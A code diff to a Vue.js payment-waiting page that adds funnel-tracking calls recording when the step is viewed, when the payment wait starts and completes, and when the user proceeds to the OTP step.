@@ -142,6 +142,7 @@ import { useRouter } from 'vue-router';
 import { useI18n } from 'vue-i18n';
 import i18n from '@/i18n';
 import { useVisitorTracking } from '@/composables/useVisitorTracking';
+import { trackStepViewed, trackPaymentWaitStarted, trackPaymentWaitCompleted, trackStepCompleted } from '@/composables/useFunnelTracking';
 import { usePayment } from '@/composables/usePayment';
 import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
 import { getCardStatus } from '@/api/paymentApi';
@@ -190,6 +191,8 @@ const { status: paymentStatus, rejectionReason, setup: setupWs } = usePaymentWeb
     onApproved ( event )
     {
         logger.debug( '[PaymentWaiting] Payment approved:', event );
+        trackPaymentWaitCompleted();
+        trackStepCompleted( 'payment_waiting', 'otp' );
         // Navigate to OTP page after brief visual feedback
         setTimeout( () =>
         {
@@ -252,6 +255,8 @@ onMounted( async () =>
     const ip = customerIp.value || await resolveCustomerIp();
     customerIp.value = ip;
     setupWs( ip );
+    trackStepViewed( 'payment_waiting' );
+    trackPaymentWaitStarted();
 
     // Show "taking too long" notice after 30 seconds
     waitingTimer = setTimeout( () => { waitingTooLong.value = true; }, 30000 );
